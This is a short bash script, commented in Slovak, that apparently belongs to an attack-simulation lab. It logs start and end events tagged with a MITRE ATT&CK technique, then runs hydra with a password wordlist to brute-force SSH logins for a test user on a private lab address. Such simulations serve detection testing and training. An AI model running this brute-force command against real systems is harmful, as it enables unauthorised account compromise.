#!/usr/bin/env bash
# Scenar 3: Utok hrubou silou (brute-force) na SSH prihlasenie
set -e
source /scripts/attacks/lib.sh

SCENARIO="ssh_bruteforce"
log_event "$SCENARIO" "start" "credential_access" "172.28.0.10" "hydra" "TA0006/T1110.001"

hydra -l testuser -P /scripts/attacks/wordlists/passwords.txt -t 4 -f \
    ssh://172.28.0.10 || true

log_event "$SCENARIO" "end"
